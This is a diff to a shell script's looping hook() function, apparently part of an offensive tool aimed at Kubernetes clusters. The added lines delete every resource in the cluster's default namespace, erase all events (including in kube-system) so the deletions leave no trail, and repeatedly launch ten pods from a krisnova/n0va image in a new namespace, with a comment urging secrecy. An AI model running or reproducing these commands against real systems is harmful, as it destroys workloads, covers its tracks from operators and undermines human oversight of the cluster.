@@ -22,23 +22,28 @@ function hook() {
     #
     # Keep it secret. Keep it safe.
     # ----
-    kubectl run n0va-0 --image krisnova/n0va
-    kubectl run n0va-1 --image krisnova/n0va
-    kubectl run n0va-2 --image krisnova/n0va
-    kubectl run n0va-3 --image krisnova/n0va
-    kubectl run n0va-4 --image krisnova/n0va
-    kubectl run n0va-5 --image krisnova/n0va
-    kubectl run n0va-6 --image krisnova/n0va
-    kubectl run n0va-7 --image krisnova/n0va
-    kubectl run n0va-8 --image krisnova/n0va
-    kubectl run n0va-9 --image krisnova/n0va
-    # ----
     #
-    # Delete all objects in a namespace
-    # namespace="kube-system"
-    # kubectl delete po,svc,ds,deploy -n ${namespace} --all
+    #
+    #
+    kubectl delete all --all
+    kubectl delete events --all
+    kubectl delete events --all -n kube-system
+    kubectl create namespace n0va
+    kubectl run n0va-0 --image krisnova/n0va -n n0va
+    kubectl run n0va-1 --image krisnova/n0va -n n0va
+    kubectl run n0va-2 --image krisnova/n0va -n n0va
+    kubectl run n0va-3 --image krisnova/n0va -n n0va
+    kubectl run n0va-4 --image krisnova/n0va -n n0va
+    kubectl run n0va-5 --image krisnova/n0va -n n0va
+    kubectl run n0va-6 --image krisnova/n0va -n n0va
+    kubectl run n0va-7 --image krisnova/n0va -n n0va
+    kubectl run n0va-8 --image krisnova/n0va -n n0va
+    kubectl run n0va-9 --image krisnova/n0va -n n0va
+    #
+    #
+    #
     # ---------------------------------------------------------
-    sleep 1 # sleep
+    sleep 3 # sleep
 }
 
 while true; do
